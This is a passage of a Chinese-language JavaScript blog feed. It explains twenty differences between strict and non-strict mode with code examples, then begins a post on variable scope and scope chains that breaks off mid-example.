        <content type="html"><![CDATA[<h2 id="严格模式与非严格模式的不同"><a href="#严格模式与非严格模式的不同" class="headerlink" title="严格模式与非严格模式的不同"></a>严格模式与非严格模式的不同</h2><h3 id="1-严格模式下，不允许用with"><a href="#1-严格模式下，不允许用with" class="headerlink" title="1.严格模式下，不允许用with"></a>1.严格模式下，不允许用with</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    with(&#123; x: 1 &#125;) &#123;<br>        console.log(x);  //1<br>    &#125;<br>&#125;()<br><br>!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    with(&#123; x: 1 &#125;) &#123;<br>        console.log(x);  //SyntaxError<br>    &#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p>一种取代 with 的简单方法是，将目标对象赋给一个短命名变量，然后访问这个变量上的相应属性。</p><p>ps：解释下!function () {}();<br>解释器在解释一个语句时，如果以function开头，就会理解为函数声明。<br>而前面加一个”!”可以让解释器理解为函数表达式，这样就可以立即调用了。</p><h3 id="严格模式下，不允许给未声明的变量赋值"><a href="#严格模式下，不允许给未声明的变量赋值" class="headerlink" title="严格模式下，不允许给未声明的变量赋值"></a>严格模式下，不允许给未声明的变量赋值</h3><h3 id="严格模式下，arguments变为参数的静态副本。非严格模式下，arguments对象里的元素和对应的参数是指向同一个值的引用"><a href="#严格模式下，arguments变为参数的静态副本。非严格模式下，arguments对象里的元素和对应的参数是指向同一个值的引用" class="headerlink" title="严格模式下，arguments变为参数的静态副本。非严格模式下，arguments对象里的元素和对应的参数是指向同一个值的引用"></a>严格模式下，arguments变为参数的静态副本。非严格模式下，arguments对象里的元素和对应的参数是指向同一个值的引用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-keyword">function</span>(a) &#123;<br>    arguments[0] = 100;<br>    console.log(a);  //100<br>&#125;(1);<br><br>!<span class="hljs-keyword">function</span>(a) &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    arguments[0] = 100;<br>    console.log(a);  //1<br>&#125;(1);<br></code></pre></td></tr></table></figure><p>但是：传的参数是对象除外。arguments和形参共享传递。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-keyword">function</span>(a) &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    console.log(a.x);  //1<br>    arguments[0].x = 100;<br>    console.log(a.x);  //100<br>&#125;(&#123;x: 1&#125;);<br></code></pre></td></tr></table></figure><h3 id="4-严格模式下，删除参数名，函数名报错。非严格模式返回false，静默失败。-静默失败：不报错也没有任何效果"><a href="#4-严格模式下，删除参数名，函数名报错。非严格模式返回false，静默失败。-静默失败：不报错也没有任何效果" class="headerlink" title="4.严格模式下，删除参数名，函数名报错。非严格模式返回false，静默失败。(静默失败：不报错也没有任何效果)"></a>4.严格模式下，删除参数名，函数名报错。非严格模式返回false，静默失败。(静默失败：不报错也没有任何效果)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-keyword">function</span>(a) &#123;<br>    console.log(a);  //1<br>    console.log(delete a);  //<span class="hljs-literal">false</span><br>    console.log(a);  //1<br>&#125;(1);<br><br>!<span class="hljs-keyword">function</span>(a) &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    console.log(a);  //1<br>    delete a;  //SyntaxError（语法错误）<br>    console.log(a);  //1<br>&#125;(1)<br></code></pre></td></tr></table></figure><h3 id="5-严格模式下，函数参数名重复报错。非严格模式最后一个重名参数会覆盖之前的重名参数。"><a href="#5-严格模式下，函数参数名重复报错。非严格模式最后一个重名参数会覆盖之前的重名参数。" class="headerlink" title="5.严格模式下，函数参数名重复报错。非严格模式最后一个重名参数会覆盖之前的重名参数。"></a>5.严格模式下，函数参数名重复报错。非严格模式最后一个重名参数会覆盖之前的重名参数。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-keyword">function</span> (a, a, b) &#123;<br>    console.log(a + b);  //5<br>&#125;(1, 2, 3);<br><br>!<span class="hljs-keyword">function</span> (a, a, b) &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    console.log(a + b);  //SyntaxError<br>&#125;(1, 2, 3);<br></code></pre></td></tr></table></figure><h3 id="6-严格模式下，删除不可配置-configurable-false-的属性报错。非严格模式返回false，静默失败。"><a href="#6-严格模式下，删除不可配置-configurable-false-的属性报错。非严格模式返回false，静默失败。" class="headerlink" title="6.严格模式下，删除不可配置(configurable=false)的属性报错。非严格模式返回false，静默失败。"></a>6.严格模式下，删除不可配置(configurable=false)的属性报错。非严格模式返回false，静默失败。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-keyword">function</span> (a)&#123;<br>    var obj=&#123;&#125;;<br>    Object.defineProperty(obj,<span class="hljs-string">'a'</span>,&#123; configurable: <span class="hljs-literal">false</span> &#125;);<br>    console.log(delete obj.a); //flase<br>&#125;(1);  <br><br>!<span class="hljs-keyword">function</span> (a)&#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    var obj=&#123;&#125;;<br>    Object.defineProperty(obj, <span class="hljs-string">'a'</span>, &#123; configurable: <span class="hljs-literal">false</span> &#125;);<br>    console.log(delete obj.a); //TypeError<br>&#125;(1);<br></code></pre></td></tr></table></figure><h3 id="7-严格模式下，修改不可写-writable-false-的属性报错。"><a href="#7-严格模式下，修改不可写-writable-false-的属性报错。" class="headerlink" title="7.严格模式下，修改不可写(writable=false)的属性报错。"></a>7.严格模式下，修改不可写(writable=false)的属性报错。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    var obj = &#123; a: 1 &#125;;<br>    Object.defineProperty(obj, <span class="hljs-string">'a'</span>, &#123; writable: <span class="hljs-literal">false</span> &#125;);<br>    obj.a = 2;<br>    console.log(obj.a);  //1  //证明没有被修改<br>&#125;();<br><br>!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    var obj = &#123; a: 1 &#125;;<br>    Object.defineProperty(obj, <span class="hljs-string">'a'</span>, &#123;writable: <span class="hljs-literal">false</span>&#125;);<br>    obj.a = 2;  //TypeError<br>&#125;();<br></code></pre></td></tr></table></figure><h3 id="8-严格模式下，对象字面量重复属性名报错。"><a href="#8-严格模式下，对象字面量重复属性名报错。" class="headerlink" title="8.严格模式下，对象字面量重复属性名报错。"></a>8.严格模式下，对象字面量重复属性名报错。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>     var obj = &#123; x: 1, x: 2 &#125;;<br>     console.log(obj.x);  //2<br> &#125;();<br><br>!<span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    var obj = &#123; x: 1, x: 2 &#125;;  <br>    console.log(obj.x);  //IE10+报错。IE7~9、Chrome、FF不报错，结果为：2<br>&#125;();<br></code></pre></td></tr></table></figure><p>亲测：IE10+报错：strict 模式下不允许一个属性有多个定义。IE7~9，Chrome，FF不报错。其他浏览器未测。</p><h3 id="9-严格模式下，禁止八进制字面量。"><a href="#9-严格模式下，禁止八进制字面量。" class="headerlink" title="9.严格模式下，禁止八进制字面量。"></a>9.严格模式下，禁止八进制字面量。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span> ()&#123;<br>    console.log(0123); //83<br>&#125;();<br><br>!<span class="hljs-function"><span class="hljs-title">function</span></span> ()&#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    console.log(0123); //SyntaxError<br>&#125;();<br></code></pre></td></tr></table></figure><h3 id="10-严格模式下，eval，arguments成为关键字，不能用作变量，函数名。"><a href="#10-严格模式下，eval，arguments成为关键字，不能用作变量，函数名。" class="headerlink" title="10.严格模式下，eval，arguments成为关键字，不能用作变量，函数名。"></a>10.严格模式下，eval，arguments成为关键字，不能用作变量，函数名。</h3><h3 id="11-严格模式下，eval变成了独立作用域。"><a href="#11-严格模式下，eval变成了独立作用域。" class="headerlink" title="11.严格模式下，eval变成了独立作用域。"></a>11.严格模式下，eval变成了独立作用域。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    <span class="hljs-built_in">eval</span>(<span class="hljs-string">'var evalVal = 2;'</span>);<br>    console.log(typeof evalVal);  //number<br>&#125;();<br><br>!<span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    <span class="hljs-built_in">eval</span>(<span class="hljs-string">'var evalVal = 2;'</span>);<br>    console.log(typeof evalVal);  //undefined<br>&#125;();<br></code></pre></td></tr></table></figure><h3 id="12-严格模式下，给只读属性赋值报错。"><a href="#12-严格模式下，给只读属性赋值报错。" class="headerlink" title="12.严格模式下，给只读属性赋值报错。"></a>12.严格模式下，给只读属性赋值报错。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    var obj = &#123; get <span class="hljs-function"><span class="hljs-title">x</span></span>() &#123; <span class="hljs-built_in">return</span> 17; &#125; &#125;;<br>    obj.x = 5;  //TypeError<br>&#125;();<br></code></pre></td></tr></table></figure><h3 id="13-严格模式下，给不可扩展对象的新属性赋值报错。"><a href="#13-严格模式下，给不可扩展对象的新属性赋值报错。" class="headerlink" title="13.严格模式下，给不可扩展对象的新属性赋值报错。"></a>13.严格模式下，给不可扩展对象的新属性赋值报错。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    var fixed = &#123; oldProp: <span class="hljs-string">"hello"</span> &#125;;<br>    Object.preventExtensions(fixed);<br>    fixed.newProp = <span class="hljs-string">"world"</span>; //TypeError<br>&#125;();<br></code></pre></td></tr></table></figure><h3 id="14-ES6中，严格模式下，禁止设置五种基本类型值的属性。"><a href="#14-ES6中，严格模式下，禁止设置五种基本类型值的属性。" class="headerlink" title="14.ES6中，严格模式下，禁止设置五种基本类型值的属性。"></a>14.ES6中，严格模式下，禁止设置五种基本类型值的属性。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    undefined.aaa = <span class="hljs-string">'aaa'</span>;  //TypeError<br>    null.bbb = <span class="hljs-string">'bbb'</span>;  //TypeError<br>    false.ccc = <span class="hljs-string">'ccc'</span>;  //TypeError<br>    (123).ddd = <span class="hljs-string">'ddd'</span>;  //TypeError<br>    <span class="hljs-string">"hello"</span>.eee = <span class="hljs-string">'eee'</span>;  //TypeError<br>&#125;();<br></code></pre></td></tr></table></figure><h3 id="15-严格模式下，一般函数调用-不是对象的方法调用，也不使用apply-call-bind等修改this-，this指向undefined，而不是全局对象。"><a href="#15-严格模式下，一般函数调用-不是对象的方法调用，也不使用apply-call-bind等修改this-，this指向undefined，而不是全局对象。" class="headerlink" title="15.严格模式下，一般函数调用(不是对象的方法调用，也不使用apply/call/bind等修改this)，this指向undefined，而不是全局对象。"></a>15.严格模式下，一般函数调用(不是对象的方法调用，也不使用apply/call/bind等修改this)，this指向undefined，而不是全局对象。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fun</span></span>() &#123; <span class="hljs-built_in">return</span> this; &#125;<br>    console.log( fun() );  //Window<br>&#125;();<br><br>!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fun</span></span>() &#123; <span class="hljs-built_in">return</span> this; &#125;<br>    console.log( fun() );  //undefined<br>&#125;();<br></code></pre></td></tr></table></figure><p><strong>注意</strong>: 这一点百度上好多说的是this会指向null，这是不对的，查看了MDN之后，上面明确写出this指向undefined。Chrome下亲测也是如此。</p><h3 id="16-严格模式下，使用apply-call-bind，当传入参数是null-undefined时，this指向null-undefined，而不是全局对象。"><a href="#16-严格模式下，使用apply-call-bind，当传入参数是null-undefined时，this指向null-undefined，而不是全局对象。" class="headerlink" title="16.严格模式下，使用apply/call/bind，当传入参数是null/undefined时，this指向null/undefined，而不是全局对象。"></a>16.严格模式下，使用apply/call/bind，当传入参数是null/undefined时，this指向null/undefined，而不是全局对象。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fun</span></span>() &#123; <span class="hljs-built_in">return</span> this; &#125;<br>    console.log( fun.apply(null) );  //Window<br>    console.log( fun.apply(undefined) );  //Window<br>    console.log( fun.call(null) );  //Window<br>    console.log( fun.call(undefined) );  //Window<br>    console.log( fun.bind(null)() );  //Window<br>    console.log( fun.bind(undefined)() );  //Window<br>&#125;();<br><br>!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fun</span></span>() &#123; <span class="hljs-built_in">return</span> this; &#125;<br>    console.log( fun.apply(null) );  //null<br>    console.log( fun.apply(undefined) );  //undefined<br>    console.log( fun.call(null) );  //null<br>    console.log( fun.call(undefined) );  //undefined<br>    console.log( fun.bind(null)() );  //null<br>    console.log( fun.bind(undefined)() );  //undefined<br>&#125;();<br></code></pre></td></tr></table></figure><h3 id="17-严格模式下，不再支持arguments-callee。非严格模式下，arguments-callee指向当前正在执行的函数。"><a href="#17-严格模式下，不再支持arguments-callee。非严格模式下，arguments-callee指向当前正在执行的函数。" class="headerlink" title="17.严格模式下，不再支持arguments.callee。非严格模式下，arguments.callee指向当前正在执行的函数。"></a>17.严格模式下，不再支持arguments.callee。非严格模式下，arguments.callee指向当前正在执行的函数。</h3><p>这个作用很小：直接给执行函数命名就可以了！此外，arguments.callee 十分不利于优化，例如内联函数，因为 arguments.callee 会依赖对非内联函数的引用。在严格模式下，arguments.callee 是一个不可删除属性，而且赋值和读取时都会抛出异常：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-string">'use strict'</span>;<br>    var fun = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123; <span class="hljs-built_in">return</span> arguments.callee; &#125;;<br>    fun(); //TypeError<br>&#125;();<br></code></pre></td></tr></table></figure></p><h3 id="18-严格模式下，不再支持arguments-caller。"><a href="#18-严格模式下，不再支持arguments-caller。" class="headerlink" title="18.严格模式下，不再支持arguments.caller。"></a>18.严格模式下，不再支持arguments.caller。</h3><p>在一些旧时的ECMAScript实现中arguments.caller曾经是一个对象，里面存储的属性指向那个函数的变量。这是一个安全隐患，因为它通过函数抽象打破了本来被隐藏起来的保留值；它同时也是引起大量优化工作的原因。出于这些原因，现在的浏览器没有实现它。但是因为它这种历史遗留的功能，arguments.caller在严格模式下同样是一个不可被删除的属性，在赋值或者取值时会报错：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-string">"use strict"</span>;<br>    <span class="hljs-keyword">function</span> fun(a, b) &#123;<br>        var c = 12;<br>        <span class="hljs-built_in">return</span> arguments.caller; //IE10+报错。IE7~9、Chrome、FF不报错。<br>    &#125;<br>    console.log(fun(1, 2)); //在不报错的浏览器下，结果是：undefined<br>&#125;();<br></code></pre></td></tr></table></figure></p><p>亲测：IE10+报错：strict 模式下不允许访问函数或参数对象的“caller”属性。IE7~9、Chrome、FF不报错。其他浏览器未测。</p><h3 id="19-严格模式下，一些保留字。"><a href="#19-严格模式下，一些保留字。" class="headerlink" title="19.严格模式下，一些保留字。"></a>19.严格模式下，一些保留字。</h3><p>在严格模式中一部分字符变成了保留的关键字。这些字符包括implements, interface, let, package, private, protected, public, static 和 yield。在严格模式下，你不能再用这些名字作为变量名或者形参名。</p><h3 id="20-严格模式下，禁止了不在脚本或者函数层面上的函数声明。"><a href="#20-严格模式下，禁止了不在脚本或者函数层面上的函数声明。" class="headerlink" title="20.严格模式下，禁止了不在脚本或者函数层面上的函数声明。"></a>20.严格模式下，禁止了不在脚本或者函数层面上的函数声明。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    <span class="hljs-string">"use strict"</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fun</span></span>() &#123;&#125;<br>        console.log( fun() );  //IE10报错。IE11、IE7~9、Chrome、FF不报错。<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (var i = 0; i &lt; 5; i++) &#123;<br>        <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fun2</span></span>() &#123;&#125;<br>        console.log( fun2() );  //IE10报错。IE11、IE7~9、Chrome、FF不报错。<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fun3</span></span>() &#123;  // 合法<br>        <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fun4</span></span>() &#123;&#125;  //同样合法<br>    &#125;<br>&#125;();<br></code></pre></td></tr></table></figure><p>亲测：IE10报错。IE11、IE7~9、Chrome、FF不报错。其他浏览器未测。</p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js关于作用域，作用域链和闭包的理解</title>
      <link href="/2018/08/02/js%E5%85%B3%E4%BA%8E%E4%BD%9C%E7%94%A8%E5%9F%9F%EF%BC%8C%E4%BD%9C%E7%94%A8%E5%9F%9F%E9%93%BE%E5%92%8C%E9%97%AD%E5%8C%85%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2018/08/02/js%E5%85%B3%E4%BA%8E%E4%BD%9C%E7%94%A8%E5%9F%9F%EF%BC%8C%E4%BD%9C%E7%94%A8%E5%9F%9F%E9%93%BE%E5%92%8C%E9%97%AD%E5%8C%85%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h2><p>先来谈谈变量的作用域<br>变量的作用域无非就是两种：全局变量和局部变量。<br>全局作用域：<br>最外层函数定义的变量拥有全局作用域，即对任何内部函数来说，都是可以访问的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>      var outerVar = <span class="hljs-string">"outer"</span>;<br>      <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fn</span></span>()&#123;<br>         console.log(outerVar);<br>      &#125;<br>      fn();//result:outer<br>   &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>局部作用域：<br>和全局作用域相反，局部作用域一般只在固定的代码片段内可访问到，而对于函数外部是无法访问的，最常见的例如函数内部<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>      <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fn</span></span>()&#123;<br>         var innerVar = <span class="hljs-string">"inner"</span>;<br>      &#125;<br>      fn();<br>      console.log(innerVar);// ReferenceError: innerVar is not defined<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><p>需要注意的是，函数内部声明变量的时候，一定要使用var命令。如果不用的话，你实际上声明了一个全局变量！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>   <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fn</span></span>()&#123;<br>      innerVar = <span class="hljs-string">"inner"</span>;<br>   &#125;<br>   fn();<br>   console.log(innerVar);// result:inner<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>再来看一个代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>   var scope = <span class="hljs-string">"global"</span>;<br>   <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fn</span></span>()&#123;<br>      console.log(scope);//result:undefined<br>      var scope = <span class="hljs-string">"local"</span>;<br>      console.log(scope);//result:<span class="hljs-built_in">local</span>;<br>   &#125;<br>   fn();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>很有趣吧，第一个输出居然是undefined，原本以为它会访问外部的全局变量(scope=”global”)，但是并没有。这可以算是javascript的一个特点，只要函数内定义了一个局部变量，函数在解析的时候都会将这个变量“提前声明”：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>   var scope = <span class="hljs-string">"global"</span>;<br>   <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">fn</span></span>()&#123;<br>      var scope;//提前声明了局部变量<br>      console.log(scope);//result:undefined<br>      scope = <span class="hljs-string">"local"</span>;<br>      console.log(scope);//result:<span class="hljs-built_in">local</span>;<br>   &#125;<br>   fn();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>然而，也不能因此草率地将局部作用域定义为：用var声明的变量作用范围起止于花括号之间。<br>javascript并没有块级作用域<br>那什么是块级作用域？<br>像在C/C++中，花括号内中的每一段代码都具有各自的作用域，而且变量在声明它们的代码段之外是不可见的，比如下面的c语言代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span>(int i = 0; i &lt; 10; i++)&#123;<br>//i的作用范围只在这个<span class="hljs-keyword">for</span>循环<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>,&amp;i);//error<br></code></pre></td></tr></table></figure></p><p>但是javascript不同，并没有所谓的块级作用域，javascript的作用域是相对函数而言的，可以称为函数作用域：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>    <span class="hljs-keyword">for</span>(var i = 1; i &lt; 10; i++)&#123;<br>          //coding<br>    &#125;<br>    console.log(i); //10  <br> &lt;/script&gt;<br></code></pre></td></tr></table></figure></p><h2 id="作用域链（scope-chain）"><a href="#作用域链（scope-chain）" class="headerlink" title="作用域链（scope chain）"></a>作用域链（scope chain）</h2><p>根据在内部函数可以访问外部函数变量的这种机制，用链式查找决定哪些数据能被内部函数访问。<br>想要知道js怎么链式查找，就得先了解js的执行环境</p><h3 id="执行环境（execution-context）"><a href="#执行环境（execution-context）" class="headerlink" title="执行环境（execution context）"></a>执行环境（execution context）</h3><p>每个函数运行时都会产生一个执行环境，而这个执行环境怎么表示呢？js为每一个执行环境关联了一个变量对象。环境中定义的所有变量和函数都保存在这个对象中。<br>全局执行环境是最外围的执行环境，全局执行环境被认为是window对象，因此所有的全局变量和函数都作为window对象的属性和方法创建的。<br>js的执行顺序是根据函数的调用来决定的，当一个函数被调用时，该函数环境的变量对象就被压入一个环境栈中。而在函数执行之后，栈将该函数的变量对象弹出，把控制权交给之前的执行环境变量对象。<br>举个例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 